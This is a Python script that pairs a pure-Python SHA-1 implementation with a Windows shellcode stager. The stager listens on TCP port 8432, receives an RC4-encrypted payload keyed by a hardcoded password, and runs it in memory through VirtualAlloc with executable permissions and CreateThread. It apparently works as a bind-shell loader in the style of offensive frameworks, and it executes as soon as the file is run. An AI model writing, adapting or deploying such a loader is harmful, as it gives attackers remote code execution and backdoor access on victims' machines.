import io, struct, socket, binascii, ctypes, random, time


try:
    range = xrange
except NameError:
    pass


def _left_rotate(n, b):
    """Left rotate a 32-bit integer n by b bits."""
    return ((n << b) | (n >> (32 - b))) & 0xffffffff


def _process_chunk(chunk, h0, h1, h2, h3, h4):
    """Process a chunk of data and return the new digest variables."""
    assert len(chunk) == 64

    w = [0] * 80

    # Break chunk into sixteen 4-byte big-endian words w[i]
    for i in range(16):
        w[i] = struct.unpack(b'>I', chunk[i * 4:i * 4 + 4])[0]

    # Extend the sixteen 4-byte words into eighty 4-byte words
    for i in range(16, 80):
        w[i] = _left_rotate(w[i - 3] ^ w[i - 8] ^ w[i - 14] ^ w[i - 16], 1)

    # Initialize hash value for this chunk
    a = h0
    b = h1
    c = h2
    d = h3
    e = h4

    for i in range(80):
        if 0 <= i <= 19:
            # Use alternative 1 for f from FIPS PB 180-1 to avoid bitwise not
            f = d ^ (b & (c ^ d))
            k = 0x5A827999
        elif 20 <= i <= 39:
            f = b ^ c ^ d
            k = 0x6ED9EBA1
        elif 40 <= i <= 59:
            f = (b & c) | (b & d) | (c & d)
            k = 0x8F1BBCDC
        elif 60 <= i <= 79:
            f = b ^ c ^ d
            k = 0xCA62C1D6

        a, b, c, d, e = ((_left_rotate(a, 5) + f + e + k + w[i]) & 0xffffffff,
                         a, _left_rotate(b, 30), c, d)

    # Add this chunk's hash to result so far
    h0 = (h0 + a) & 0xffffffff
    h1 = (h1 + b) & 0xffffffff
    h2 = (h2 + c) & 0xffffffff
    h3 = (h3 + d) & 0xffffffff
    h4 = (h4 + e) & 0xffffffff

    return h0, h1, h2, h3, h4


class Sha1Hash(object):
    """A class that mimics that hashlib api and implements the SHA-1 algorithm."""

    name = 'python-sha1'
    digest_size = 20
    block_size = 64

    def __init__(self):
        # Initial digest variables
        self._h = (
            0x67452301,
            0xEFCDAB89,
            0x98BADCFE,
            0x10325476,
            0xC3D2E1F0,
        )

        # bytes object with 0 <= len < 64 used to store the end of the message
        # if the message length is not congruent to 64
        self._unprocessed = b''
        # Length in bytes of all data that has been processed so far
        self._message_byte_length = 0

    def update(self, arg):
        """Update the current digest.
        This may be called repeatedly, even after calling digest or hexdigest.
        Arguments:
            arg: bytes, bytearray, or BytesIO object to read from.
        """
        if isinstance(arg, str):
        	arg = bytearray(arg, encoding='utf-8')
        if isinstance(arg, (bytes, bytearray)):
            arg = io.BytesIO(arg)

        # Try to build a chunk out of the unprocessed data, if any
        chunk = self._unprocessed + arg.read(64 - len(self._unprocessed))

        # Read the rest of the data, 64 bytes at a time
        while len(chunk) == 64:
            self._h = _process_chunk(chunk, *self._h)
            self._message_byte_length += 64
            chunk = arg.read(64)

        self._unprocessed = chunk
        return self

    def digest(self):
        """Produce the final hash value (big-endian) as a bytes object"""
        return b''.join(struct.pack(b'>I', h) for h in self._produce_digest())

    def hexdigest(self):
        """Produce the final hash value (big-endian) as a hex string"""
        return '%08x%08x%08x%08x%08x' % self._produce_digest()

    def _produce_digest(self):
        """Return finalized digest variables for the data processed so far."""
        # Pre-processing:
        message = self._unprocessed
        message_byte_length = self._message_byte_length + len(message)

        # append the bit '1' to the message
        message += b'\x80'

        # append 0 <= k < 512 bits '0', so that the resulting message length (in bytes)
        # is congruent to 56 (mod 64)
        message += b'\x00' * ((56 - (message_byte_length + 1) % 64) % 64)

        # append length of message (before pre-processing), in bits, as 64-bit big-endian integer
        message_bit_length = message_byte_length * 8
        message += struct.pack(b'>Q', message_bit_length)

        # Process the final chunk
        # At this point, the length of the message is either 64 or 128 bytes.
        h = _process_chunk(message[:64], *self._h)
        if len(message) == 64:
            return h
        return _process_chunk(message[64:], *h)


def sha1(data):
    """SHA-1 Hashing Function
    A custom SHA-1 hashing function implemented entirely in Python.
    Arguments:
        data: A bytes or BytesIO object containing the input message to hash.
    Returns:
        A hex SHA-1 digest of the input message.
    """
    return Sha1Hash().update(data).digest()



shellcodepy, var1 = None, None

rc4pwd = 'qwertyuiop123456'


def rc4(data, key):
    """RC4 encryption and decryption method."""
    S, j, out = list(range(256)), 0, []
    for i in range(256):
        j = (j + S[i] + (key[i % len(key)])) % 256
        S[i], S[j] = S[j], S[i]
    i = j = 0
    for ch in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        out.append(((ch) ^ S[(S[i] + S[j]) % 256]))
    return bytes(out)
def func1():
	try:
		global rc4pwd
		sha1rc4 = sha1(rc4pwd)
		xorkey = sha1rc4[0:4]
		rc4key = sha1rc4[4:20]
		xorkeyval = struct.unpack('<i', xorkey)[0]

		global var1
		global datapack
		var1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		var1.bind(('0.0.0.0', 8432))
		var1.listen(1)
		datapack,_ = var1.accept()
		datahandler = struct.pack('<i', datapack.fileno())
		l = struct.unpack('<i', datapack.recv(4))[0]
		xl = l ^ xorkeyval
		print('recv_bytes_len',l,xl)
		datastream = b"\x00\x01\x02\x03\x04" # fill bytes
		while len(datastream) < xl: datastream += datapack.recv(xl)
		print('datastream recv',len(datastream))
		datastream_dec_rc4 = rc4(datastream[5:],rc4key)
		all_dec_rc4 = datastream[:5]+datastream_dec_rc4
		#f=open('payload_rc4.bin','wb')
		#f.write(datastream)
		#f.close()		
		#f=open('payload_rc4_dec.bin','wb')
		#f.write(all_dec_rc4)
		#f.close()
		#exit()
		cbuffer = ctypes.create_string_buffer(all_dec_rc4, len(datastream))
		cbuffer[0] = binascii.unhexlify('BF')
		for i in range(4): cbuffer[i+1] = datahandler[i]
		return cbuffer
	except Exception as e:
		raise e
def func2(arg2):
	if arg2 != None:
		binarg2 = bytearray(arg2)
		#kernel32 = ctypes.cdll.LoadLibrary("kernel32.dll") #kernel32.dll
		#kernel32.VirtualAlloc.restype = ctypes.c_uint64 #c_uint64
		shellcode_ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(binarg2)),ctypes.c_uint64(0x3000),ctypes.c_uint64(0x40))
		#shellcode_ptr = kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(buf_size), 0x3000, 0x40) #
		ctypes.windll.kernel32.VirtualLock(ctypes.c_uint64(shellcode_ptr), ctypes.c_int(len(binarg2)))
		cbuff_ptr = (ctypes.c_char * len(binarg2)).from_buffer(binarg2)
		ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int64(shellcode_ptr), cbuff_ptr, ctypes.c_int(len(binarg2)))
		ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_uint64(shellcode_ptr),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))
		ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
shellcodepy = func1()
func2(shellcodepy)